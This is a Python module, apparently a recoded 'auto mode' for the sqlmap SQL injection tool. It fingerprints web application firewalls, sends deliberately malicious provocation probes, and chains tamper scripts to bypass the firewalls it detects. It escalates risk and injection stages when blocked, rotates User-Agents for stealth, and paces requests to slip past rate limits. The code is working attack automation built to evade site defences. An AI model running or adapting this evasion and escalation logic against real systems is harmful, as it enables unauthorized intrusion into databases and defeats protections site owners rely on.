    if responseHeaders:
        try:
            if hasattr(responseHeaders, 'headers'):
                header_str = " ".join(str(h).lower() for h in responseHeaders.headers)
                for h in responseHeaders.headers:
                    if ":" in str(h):
                        key, val = str(h).split(":", 1)
                        header_dict[key.strip().lower()] = val.strip().lower()
            elif isinstance(responseHeaders, dict):
                header_str = " ".join("%s %s" % (k.lower(), v.lower()) for k, v in responseHeaders.items())
                header_dict = {k.lower(): v.lower() for k, v in responseHeaders.items()}
        except Exception:
            pass

    # Prepare body text for matching
    body_str = ""
    if responseBody:
        try:
            body_str = responseBody.lower()[:5000]  # DalFox limits body scan
        except Exception:
            pass

    # Layer 1+2: Match against fingerprint database
    for waf_name, fingerprint in WAF_FINGERPRINT_HEADERS.items():
        confidence = 0.0

        # Layer 1: Header matching
        for header_pattern in fingerprint.get("headers", []):
            pattern_lower = header_pattern.lower()

            # Check for "key: value" style patterns (e.g., "server: sucuri")
            if ":" in pattern_lower:
                # Match against combined header string
                if pattern_lower in header_str:
                    confidence += 0.5
                    break
            else:
                # Match against individual header keys only
                for key in header_dict:
                    if key == pattern_lower or pattern_lower in key:
                        confidence += 0.5
                        break
                # Also check header values for short tokens (e.g., "cf-ray")
                if confidence == 0.0:
                    for key, val in header_dict.items():
                        if pattern_lower in val or pattern_lower in ("%s: %s" % (key, val)):
                            confidence += 0.5
                            break

        # Layer 2: Body pattern matching
        for body_pattern in fingerprint.get("body_patterns", []):
            pattern_lower = body_pattern.lower()
            if pattern_lower in body_str:
                confidence += 0.3
                break

        # Layer 3: Status code boost (DalFox-style)
        if statusCode and statusCode in WAF_BLOCK_STATUS_CODES:
            confidence += 0.05

        # Apply base confidence if any match found
        if confidence > 0:
            # Take the lesser of accumulated vs base confidence to avoid double-application
            confidence = min(confidence, fingerprint.get("confidence", 0.8))
            detected_wafs[waf_name] = round(confidence, 2)

    # Cache result
    if cacheKey is not None:
        _setCachedWafResult(cacheKey, detected_wafs)

    return detected_wafs


def probeWaf(url):
    """
    DalFox-style WAF provocation probe:
    Sends deliberately malicious payloads to trigger WAF response.
    Now sends probes concurrently for 3x faster detection.
    Analyzes the blocking response for WAF identification.

    Returns: dict with detected WAF names and confidence scores
    """
    try:
        import urllib.request
        import urllib.parse
        import random
    except ImportError:
        return {}

    detected_wafs = {}

    dataToStdout("\033[01;36m[WAF-PROBE]\033[0m Sending provocation probes (concurrent)...\n")

    try:
        parsed = urllib.parse.urlparse(url)
        base_url = urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, "", ""
        ))

        def _sendSingleProbe(payload):
            """Send a single WAF probe and return (status_code, headers, body)."""
            try:
                probe_url = "%s?dalfox_waf_probe=%s" % (base_url, urllib.parse.quote(payload))
                request = urllib.request.Request(probe_url)
                request.add_header("User-Agent", random.choice(USER_AGENT_POOL))

                try:
                    response = urllib.request.urlopen(request, timeout=15)
                    return response.getcode(), response.headers, response.read().decode("utf-8", errors="ignore")
                except urllib.error.HTTPError as e:
                    body = e.read().decode("utf-8", errors="ignore") if hasattr(e, 'fp') and e.fp else ""
                    return e.code, e.headers, body
                except Exception:
                    return None, None, None
            except Exception:
                return None, None, None

        payloads = WAF_PROBE_PAYLOADS[:3]

        if _HAS_CONCURRENT and len(payloads) > 1:
            # Send probes concurrently
            start_time = time.time()
            with ThreadPoolExecutor(max_workers=min(len(payloads), 3)) as executor:
                futures = {executor.submit(_sendSingleProbe, p): p for p in payloads}
                for future in as_completed(futures):
                    status_code, headers, body = future.result()
                    if status_code and status_code in WAF_BLOCK_STATUS_CODES:
                        dataToStdout("\033[01;36m[WAF-PROBE]\033[0m \033[01;33mBlocking response detected (HTTP %d)\033[0m\n" % status_code)
                        detected = fingerprintWaf(headers, body, status_code)
                        if detected:
                            detected_wafs.update(detected)
            elapsed = time.time() - start_time
            dataToStdout("\033[01;36m[WAF-PROBE]\033[0m Parallel probes completed in %.1fs\033[0m\n" % elapsed)
        else:
            # Sequential fallback
            for payload in payloads:
                status_code, headers, body = _sendSingleProbe(payload)
                if status_code and status_code in WAF_BLOCK_STATUS_CODES:
                    dataToStdout("\033[01;36m[WAF-PROBE]\033[0m \033[01;33mBlocking response detected (HTTP %d)\033[0m\n" % status_code)
                    detected = fingerprintWaf(headers, body, status_code)
                    if detected:
                        detected_wafs.update(detected)

        if not detected_wafs:
            detected_wafs["Generic WAF"] = 0.50
            dataToStdout("\033[01;36m[WAF-PROBE]\033[0m \033[01;33mWAF detected but not specifically identified\033[0m\n")
        else:
            waf_list = ["%s (%.0f%%)" % (w, c * 100) for w, c in sorted(detected_wafs.items(), key=lambda x: -x[1])]
            dataToStdout("\033[01;36m[WAF-PROBE]\033[0m WAF Probe Results: %s\n" % ", ".join(waf_list))

    except Exception as ex:
        warnMsg = "[WAF-PROBE] Provocation probe failed: %s" % str(ex)
        logger.warning(warnMsg)

    return detected_wafs


# =============================================================================
# Core Auto Engine Functions
# =============================================================================

def autoInit():
    """
    Recoded By Xbibz Official
    Initialize --auto mode: configure all settings for fully automated detection.
    This runs BEFORE any scanning begins.
    Combines ParamSpider param discovery + DalFox WAF intelligence + Turbo performance.
    """
    infoMsg = "[AUTO] Initializing fully automated mode v3.1 (Turbo) - Recoded By Xbibz Official"
    logger.info(infoMsg)

    # Force batch mode (no interactive prompts)
    conf.batch = True

    # Auto-answers for all prompts
    if not conf.answers:
        conf.answers = "crack=N,dict=Y,continue=Y,exploit=Y,keep=N,skip=N,follow=N,redirect=Y,retry=Y,quit=N,extend=Y,reduce=Y,futile=Y"
    else:
        for ans in ["crack=N", "continue=Y", "exploit=Y", "keep=N", "skip=N", "extend=Y", "reduce=Y", "futile=Y"]:
            if ans.split("=")[0] not in conf.answers:
                conf.answers += "," + ans

    # Enable random user agent for stealth (DalFox-style)
    if not conf.randomAgent and not conf.agent:
        conf.randomAgent = True
        infoMsg = "[AUTO] Enabled random User-Agent for stealth"
        logger.info(infoMsg)

    # Set smart detection level based on auto mode
    if conf.level is None or conf.level == 1:
        conf.level = 3  # Test Cookie, User-Agent, Referer
        infoMsg = "[AUTO] Set detection level to 3 (Cookie, UA, Referer testing)"
        logger.info(infoMsg)

    if conf.risk is None or conf.risk == 1:
        conf.risk = 2  # Moderate risk for better detection
        infoMsg = "[AUTO] Set detection risk to 2 (moderate-risk tests included)"
        logger.info(infoMsg)

    # Enable keep-alive for connection reuse (fewer TCP handshakes)
    if not conf.keepAlive:
        conf.keepAlive = True

    # Smart thread count: scale with CPU count, cap at 8 for safety
    import multiprocessing
    cpu_count = multiprocessing.cpu_count() if hasattr(multiprocessing, 'cpu_count') else 2
    smart_threads = min(max(cpu_count + 1, 3), 8)
    if conf.threads is None or conf.threads < 3:
        conf.threads = smart_threads
        infoMsg = "[AUTO] Set threads to %d (CPU-aware scaling)" % smart_threads
        logger.info(infoMsg)

    # Auto-detect WAF is always on in --auto mode
    if conf.skipWaf:
        conf.skipWaf = False
        infoMsg = "[AUTO] Enabled WAF detection (was disabled)"
        logger.info(infoMsg)

    # Set timeout higher for WAF-protected sites
    if conf.timeout is None or conf.timeout == 30:
        conf.timeout = 60

    # Increase retries for resilience
    if conf.retries is None or conf.retries < 3:
        conf.retries = 5

    # Initialize performance engine
    _perfMetrics["startTime"] = time.time()
    _adaptiveState["currentThreads"] = conf.threads
    _adaptiveState["currentDelay"] = conf.delay or 0

    # Store auto mode state
    conf.autoMode = True
    kb.autoStage = 0  # Current escalation stage
    kb.autoTampersApplied = []  # Track applied tamper chains
    kb.autoWafDetected = False
    kb.autoWafName = None
    kb.autoWafConfidence = {}  # DalFox-style confidence scores
    kb.autoSpiderUrls = []  # ParamSpider discovered URLs
    kb.autoProbeCount = 0  # WAF provocation probe count

    dataToStdout("\n\033[01;31m[AUTO]\033[0m \033[01;37mFully Automated Mode v3.1 Turbo Activated - Recoded By Xbibz Official\033[0m\n")
    dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;36mParamSpider + DalFox + Turbo Performance Engine\033[0m\n")
    dataToStdout("\033[01;31m[AUTO]\033[0m Level=%d, Risk=%d, Threads=%d, RandomAgent=%s\n\n" % (
        conf.level, conf.risk, conf.threads, conf.randomAgent))


def autoSpiderInit():
    """
    Initialize spider mode (--spider flag).
    ParamSpider-style parameter discovery before scanning.
    """
    if not conf.url:
        errMsg = "[SPIDER] No target URL specified for spidering"
        logger.error(errMsg)
        return []

    dataToStdout("\n\033[01;35m[SPIDER]\033[0m \033[01;37mParamSpider-Style Discovery Mode - Recoded By Xbibz Official\033[0m\n")

    discovered_urls = spiderTarget(conf.url, includeSubs=True)

    if discovered_urls:
        # Add discovered URLs as targets
        for url in discovered_urls:
            try:
                # Replace FUZZ placeholder with a test value
                test_url = url.replace("=FUZZ", "=1")
                kb.targets.add((test_url, conf.method, conf.data, conf.cookie, None))
            except Exception:
                continue

        kb.autoSpiderUrls = discovered_urls
        conf.multipleTargets = True

        infoMsg = "[SPIDER] Added %d URLs to target queue" % len(discovered_urls)
        logger.info(infoMsg)
        dataToStdout("\033[01;35m[SPIDER]\033[0m \033[01;32mAdded %d URLs to scan queue\033[0m\n\n" % len(discovered_urls))
    else:
        warnMsg = "[SPIDER] No URLs discovered - will proceed with provided target only"
        logger.warning(warnMsg)
        dataToStdout("\033[01;35m[SPIDER]\033[0m \033[01;33mNo URLs found - proceeding with original target\033[0m\n\n")

    return discovered_urls


def autoWafHandler():
    """
    DalFox-style WAF detection handler.
    Called when WAF is detected during scanning.
    Performs multi-layer fingerprinting and applies targeted bypass strategies.
    """
    if not conf.get("autoMode"):
        return

    kb.autoWafDetected = True

    # Collect identified WAFs from sqlmap's identYwaf
    identified_wafs = kb.get("identifiedWafs", set())

    # Phase 1: Use identYwaf results
    if identified_wafs:
        waf_names = list(identified_wafs)
        kb.autoWafName = waf_names
        infoMsg = "[AUTO] identYwaf identified: %s" % ", ".join(waf_names)
        logger.info(infoMsg)
        dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;33mWAF Identified: %s\033[0m\n" % ", ".join(waf_names))

        # Assign high confidence to identYwaf results
        for waf in waf_names:
            kb.autoWafConfidence[waf] = 0.95
    else:
        # Phase 2: DalFox-style passive fingerprinting from response
        try:
            from lib.request.connect import Connect as Request
            page, headers, code = Request.queryPage(content=True, ignoreSecondOrder=True)
            if headers or page:
                detected = fingerprintWaf(headers, page, code)
                if detected:
                    kb.autoWafConfidence.update(detected)
                    waf_list = ["%s (%.0f%%)" % (w, c * 100) for w, c in sorted(detected.items(), key=lambda x: -x[1])]
                    kb.autoWafName = list(detected.keys())
                    dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;33mDalFox WAF Fingerprint: %s\033[0m\n" % ", ".join(waf_list))
                else:
                    dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;33mWAF Detected (generic - will probe)\033[0m\n")
        except Exception:
            pass

    # Phase 3: DalFox-style provocation probe (if WAF detected but not identified)
    if not kb.get("autoWafConfidence") and conf.url:
        try:
            probed = probeWaf(conf.url)
            if probed:
                kb.autoWafConfidence.update(probed)
                kb.autoWafName = list(probed.keys())
                waf_list = ["%s (%.0f%%)" % (w, c * 100) for w, c in sorted(probed.items(), key=lambda x: -x[1])]
                dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;33mWAF Probe Result: %s\033[0m\n" % ", ".join(waf_list))
        except Exception:
            pass

    # Phase 4: Select and apply bypass strategy based on detected WAF
    strategy = _selectBypassStrategy(kb.autoWafName or [])

    if strategy:
        _applyBypassStrategy(strategy)
    else:
        # Fallback: use escalation stage 2
        _applyTampers(ESCALATION_STAGES[1])

    # DalFox-style: Adjust timing based on WAF strategy
    waf_delay = strategy.get("delay_ms", 0) if strategy else 0
    if waf_delay > 0:
        delay_sec = waf_delay / 1000.0
        if conf.delay is None or conf.delay < delay_sec:
            conf.delay = delay_sec
            infoMsg = "[AUTO] Set request delay to %.1fs (WAF rate-limit avoidance)" % delay_sec
            logger.info(infoMsg)
    elif conf.delay is None:
        conf.delay = 1
        infoMsg = "[AUTO] Set request delay to 1 second (WAF rate-limit avoidance)"
        logger.info(infoMsg)

    # Increase time-sec for time-based tests (WAF can add latency)
    if conf.timeSec is None or conf.timeSec < 10:
        conf.timeSec = 10
        infoMsg = "[AUTO] Set time-sec to 10 (compensating for WAF latency)"
        logger.info(infoMsg)

    dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;32mCountermeasures: tamper=%s, delay=%ss, timeSec=%s\033[0m\n\n" % (
        conf.tamper, conf.delay, conf.timeSec))


def _selectBypassStrategy(identified_wafs):
    """
    DalFox-style: Select bypass strategy for identified WAF(s).
    Merges strategies if multiple WAFs detected (orthogonal expansion).
    """
    if not identified_wafs:
        return GENERIC_WAF_STRATEGY

    merged_tampers = []
    merged_encodings = []
    merged_mutations = []
    max_delay = 0
    seen_tampers = set()
    seen_encodings = set()
    seen_mutations = set()

    for waf in identified_wafs:
        # Try exact match first
        strategy = WAF_BYPASS_STRATEGIES.get(waf)

        if not strategy:
            # Try partial match
            for known_waf, strat in WAF_BYPASS_STRATEGIES.items():
                if known_waf.lower() in waf.lower() or waf.lower() in known_waf.lower():
                    strategy = strat
                    break

        if strategy:
            for t in strategy.get("tampers", []):
                if t not in seen_tampers:
                    merged_tampers.append(t)
                    seen_tampers.add(t)

            for e in strategy.get("encodings", []):
                if e not in seen_encodings:
                    merged_encodings.append(e)
                    seen_encodings.add(e)

            for m in strategy.get("mutations", []):
                if m not in seen_mutations:
                    merged_mutations.append(m)
                    seen_mutations.add(m)

            max_delay = max(max_delay, strategy.get("delay_ms", 0))

    if not merged_tampers:
        return GENERIC_WAF_STRATEGY

    return {
        "tampers": merged_tampers,
        "encodings": merged_encodings,
        "mutations": merged_mutations,
        "delay_ms": max_delay,
    }


def _applyBypassStrategy(strategy):
    """Apply a DalFox-style bypass strategy to the current configuration."""
    tampers = strategy.get("tampers", [])

    if tampers:
        _applyTampers(tampers)

    # Log strategy details
    encodings = strategy.get("encodings", [])
    mutations = strategy.get("mutations", [])
    delay = strategy.get("delay_ms", 0)

    if encodings:
        dataToStdout("\033[01;36m[AUTO-STRATEGY]\033[0m Encodings: %s\n" % ", ".join(encodings))
    if mutations:
        dataToStdout("\033[01;36m[AUTO-STRATEGY]\033[0m Mutations: %s\n" % ", ".join(mutations))
    if delay:
        dataToStdout("\033[01;36m[AUTO-STRATEGY]\033[0m Delay hint: %dms\n" % delay)


def _applyTampers(tamper_list):
    """
    Apply the selected tamper scripts to the current configuration.
    Merges with any user-specified tamper scripts.
    """
    current_tampers = []
    if conf.tamper:
        current_tampers = [t.strip() for t in re.split(r'[,|;]', conf.tamper)]

    new_tampers = []
    for t in tamper_list:
        if t not in current_tampers:
            new_tampers.append(t)
            current_tampers.append(t)

    if new_tampers:
        conf.tamper = ",".join(current_tampers)
        kb.autoTampersApplied = current_tampers

        infoMsg = "[AUTO] Applied tamper scripts: %s (added: %s)" % (conf.tamper, ",".join(new_tampers))
        logger.info(infoMsg)
        dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;32mTamper chain applied: %s\033[0m\n" % conf.tamper)

        # Reload tamper functions if we're already past init
        try:
            from lib.core.option import _setTamperingFunctions
            _setTamperingFunctions()
        except Exception as ex:
            warnMsg = "[AUTO] Failed to reload tamper functions: %s" % getSafeExString(ex)
            logger.warning(warnMsg)


def autoEscalate():
    """
    DalFox-inspired progressive escalation:
    When current tamper chain is not working, escalate to more aggressive chains.
    Called when injection tests fail despite WAF detection.
    """
    if not conf.get("autoMode"):
        return False

    current_stage = kb.get("autoStage", 0)
    next_stage = current_stage + 1

    if next_stage >= len(ESCALATION_STAGES):
        infoMsg = "[AUTO] Maximum escalation stage reached - all tamper chains exhausted"
        logger.info(infoMsg)
        dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;33mMaximum escalation reached - trying advanced techniques\033[0m\n")

        _tryAlternativeTechniques()
        return False

    kb.autoStage = next_stage
    next_tampers = ESCALATION_STAGES[next_stage]

    infoMsg = "[AUTO] Escalating to stage %d: %s" % (next_stage + 1, ",".join(next_tampers))
    logger.info(infoMsg)
    dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;33mEscalating to stage %d: %s\033[0m\n" % (next_stage + 1, ",".join(next_tampers)))

    # Reset tamper and apply new chain
    _applyTampers(next_tampers)
    conf.tamper = ",".join(next_tampers)

    # Also try increasing level and risk
    if conf.level < 5:
        conf.level = min(conf.level + 1, 5)
        infoMsg = "[AUTO] Increased level to %d" % conf.level
        logger.info(infoMsg)

    if conf.risk < 3:
        conf.risk = min(conf.risk + 1, 3)
        infoMsg = "[AUTO] Increased risk to %d" % conf.risk
        logger.info(infoMsg)

    # Increase delay for more aggressive payloads
    if conf.delay and conf.delay < 2:
        conf.delay = 2

    return True


def _tryAlternativeTechniques():
    """
    DalFox-inspired: When all tamper escalation stages fail,
    try alternative injection techniques and comparison methods.
    """
    dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;36mTrying alternative injection techniques...\033[0m\n")

    # Try different technique combinations
    if conf.technique and "B" not in str(conf.technique):
        dataToStdout("\033[01;31m[AUTO]\033[0m Adding Boolean-based blind technique\n")
    else:
        infoMsg = "[AUTO] Focusing on Boolean-based blind injection"
        logger.info(infoMsg)

    # Try with textOnly comparison (better for WAF-modified pages)
    if not conf.textOnly:
        conf.textOnly = True
        infoMsg = "[AUTO] Enabled textOnly comparison mode"
        logger.info(infoMsg)

    # Try with titles comparison
    if not conf.titles:
        conf.titles = True
        infoMsg = "[AUTO] Enabled title-based comparison"
        logger.info(infoMsg)

    # Try string matching if we can identify a stable string
    if not conf.string:
        infoMsg = "[AUTO] Consider using --string for more reliable comparison"
        logger.info(infoMsg)


def autoHeuristicHandler(heuristic_result):
    """
    Handle heuristic check results automatically.
    Makes smart decisions based on heuristic findings.
    """
    if not conf.get("autoMode"):
        return

    if heuristic_result == HEURISTIC_TEST.POSITIVE:
        infoMsg = "[AUTO] Heuristic test POSITIVE - SQL injection likely"
        logger.info(infoMsg)
        dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;32mHeuristic POSITIVE - proceeding with full tests\033[0m\n")

    elif heuristic_result == HEURISTIC_TEST.CASTED:
        # In auto mode, we DON'T skip casted parameters - test them thoroughly
        infoMsg = "[AUTO] Heuristic test CASTED - type casting detected, testing anyway"
        logger.info(infoMsg)
        dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;33mCasted parameter detected - auto-testing with adjusted technique\033[0m\n")
        # Force kb.ignoreCasted to False so we don't skip casted params
        kb.ignoreCasted = False

    elif heuristic_result == HEURISTIC_TEST.NEGATIVE:
        infoMsg = "[AUTO] Heuristic test NEGATIVE - will still test all parameters"
        logger.info(infoMsg)
        # In auto mode, we don't skip parameters even if heuristic is negative
        dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;34mHeuristic negative - testing all params anyway\033[0m\n")


def autoConnectionErrorHandler(error_type):
    """
    DalFox-inspired connection error handling with adaptive backoff.
    Now records performance metrics and triggers adaptive tuning.
    Handles timeouts, rate limiting, connection resets, and blocks.
    """
    if not conf.get("autoMode"):
        return

    if error_type == "timeout":
        _recordResponse(0, isError=True)
        infoMsg = "[AUTO] Connection timeout detected - increasing timeout and adding delay"
        logger.info(infoMsg)
        dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;33mTimeout detected - adjusting parameters\033[0m\n")
        if conf.timeout and conf.timeout < 120:
            conf.timeout = min(conf.timeout + 30, 120)
        if conf.delay and conf.delay < 3:
            conf.delay = min(conf.delay + 0.5, 3)
        if conf.retries and conf.retries < 10:
            conf.retries = min(conf.retries + 2, 10)

    elif error_type == "connection_reset":
        _recordResponse(0, isError=True, isWafBlock=True)
        infoMsg = "[AUTO] Connection reset detected - possible WAF block"
        logger.info(infoMsg)
        dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;33mConnection reset - WAF likely blocking\033[0m\n")
        if not kb.autoWafDetected:
            kb.autoWafDetected = True
            autoWafHandler()

    elif error_type in ("rate_limit", "rate_limited", "forbidden"):
        is_waf = error_type == "forbidden"
        _recordResponse(0, isError=True, isRateLimit=True, isWafBlock=is_waf)
        infoMsg = "[AUTO] Rate limiting detected - adding delay"
        logger.info(infoMsg)
        dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;33mRate limit detected - delay set to 5s\033[0m\n")
        if conf.delay is None or conf.delay < 5:
            conf.delay = 5
        kb.autoProbeCount = kb.get("autoProbeCount", 0) + 1
        if kb.autoProbeCount >= 3:
            if conf.threads and conf.threads > 1:
                conf.threads = max(conf.threads - 1, 1)
                infoMsg = "[AUTO] Reduced threads to %d due to rate limiting" % conf.threads
                logger.info(infoMsg)

    elif error_type == "block":
        _recordResponse(0, isError=True, isWafBlock=True)
        infoMsg = "[AUTO] IP block detected - escalating tamper chain"
        logger.info(infoMsg)
        dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;31mBLOCKED! Escalating bypass techniques...\033[0m\n")
        if conf.delay is None or conf.delay < 3:
            conf.delay = 3
        autoEscalate()

    elif error_type == "429":
        _recordResponse(0, isError=True, isRateLimit=True)
        infoMsg = "[AUTO] HTTP 429 Too Many Requests - backing off"
        logger.info(infoMsg)
        dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;33m429 rate limited - backing off with exponential delay\033[0m\n")
        current_delay = conf.delay or 1
        conf.delay = min(current_delay * 2, 10)
        dataToStdout("\033[01;31m[AUTO]\033[0m Delay increased to %ss\n" % conf.delay)

    # Trigger adaptive tuning after error handling
    autoAdaptiveTune()


def autoPostScanHandler():
    """
    Called after scanning completes to provide summary.
    Shows WAF detection results, bypass effectiveness, and performance metrics.
    """
    if not conf.get("autoMode"):
        return

    dataToStdout("\n\033[01;31m[AUTO]\033[0m \033[01;37m===== Auto Mode Summary =====\033[0m\n")

    if kb.autoWafDetected:
        waf_info = ", ".join(kb.autoWafName) if kb.autoWafName else "Generic WAF"
        confidence_info = ""
        if kb.autoWafConfidence:
            confidence_info = " (Confidence: %s)" % ", ".join(
                "%s: %.0f%%" % (w, c * 100) for w, c in sorted(kb.autoWafConfidence.items(), key=lambda x: -x[1])
            )
        dataToStdout("\033[01;31m[AUTO]\033[0m WAF Detected: %s%s\n" % (waf_info, confidence_info))

    if kb.autoTampersApplied:
        dataToStdout("\033[01;31m[AUTO]\033[0m Tampers Applied: %s\n" % ",".join(kb.autoTampersApplied))

    if kb.get("autoStage", 0) > 0:
        dataToStdout("\033[01;31m[AUTO]\033[0m Escalation Stage: %d/%d\n" % (kb.autoStage + 1, len(ESCALATION_STAGES)))

    if kb.autoSpiderUrls:
        dataToStdout("\033[01;31m[AUTO]\033[0m Spider URLs Discovered: %d\n" % len(kb.autoSpiderUrls))

    # Performance metrics
    with _perfMetricsLock:
        metrics = dict(_perfMetrics)
    start_time = metrics.get("startTime") or _perfMetrics.get("startTime") or time.time()
    elapsed = time.time() - start_time if start_time else 0
    total_reqs = metrics.get("totalRequests", 0)
    total_errors = metrics.get("totalErrors", 0)
    total_latency = metrics.get("totalLatencyMs", 0)
    rate_limits = metrics.get("rateLimitHits", 0)
    waf_blocks = metrics.get("wafBlocks", 0)

    if elapsed > 0 and total_reqs > 0:
        req_per_sec = total_reqs / elapsed
        avg_latency = total_latency / total_reqs if total_reqs > 0 else 0
        error_rate = (total_errors * 100.0 / total_reqs) if total_reqs > 0 else 0

        dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;36m--- Performance Metrics ---\033[0m\n")
        dataToStdout("\033[01;31m[AUTO]\033[0m Elapsed: %.1fs | Requests: %d (%.1f req/s)\n" % (elapsed, total_reqs, req_per_sec))
        dataToStdout("\033[01;31m[AUTO]\033[0m Avg Latency: %.0fms | Error Rate: %.1f%%\n" % (avg_latency, error_rate))
        if rate_limits or waf_blocks:
            dataToStdout("\033[01;31m[AUTO]\033[0m Rate Limits: %d | WAF Blocks: %d\n" % (rate_limits, waf_blocks))
        dataToStdout("\033[01;31m[AUTO]\033[0m Final Threads: %d | Final Delay: %ss\n" % (conf.threads or 3, conf.delay or 0))

        # Cache stats
        with _wafCacheLock:
            cache_entries = len(_wafCache)
        dataToStdout("\033[01;31m[AUTO]\033[0m WAF Cache: %d entries cached\n" % cache_entries)

    dataToStdout("\033[01;31m[AUTO]\033[0m \033[01;37m=============================\033[0m\n\n")
